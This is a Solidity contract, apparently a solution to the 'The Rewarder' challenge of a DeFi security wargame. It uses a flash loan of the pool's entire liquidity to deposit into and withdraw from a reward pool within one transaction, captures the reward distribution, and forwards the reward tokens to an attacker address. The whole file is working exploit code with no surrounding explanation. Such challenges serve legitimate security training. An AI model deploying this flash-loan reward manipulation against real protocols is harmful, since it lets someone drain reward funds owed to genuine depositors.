// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Rewardee {
    FlashLoanerPool internal immutable loanPool;
    TheRewarderPool internal immutable rewardPool;

    IERC20 internal immutable liquidityToken;
    IERC20 internal immutable rewardToken;

    address internal immutable attacker;

    constructor(address _loanPool, address _rewardPool, address _attacker) {
        loanPool = FlashLoanerPool(_loanPool);
        rewardPool = TheRewarderPool(_rewardPool);

        liquidityToken = IERC20(loanPool.liquidityToken());
        rewardToken = IERC20(rewardPool.rewardToken());

        attacker = _attacker;
    }

    function getRewards() external {
        loanPool.flashLoan(liquidityToken.balanceOf(address(loanPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(loanPool));

        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        liquidityToken.transfer(msg.sender, amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
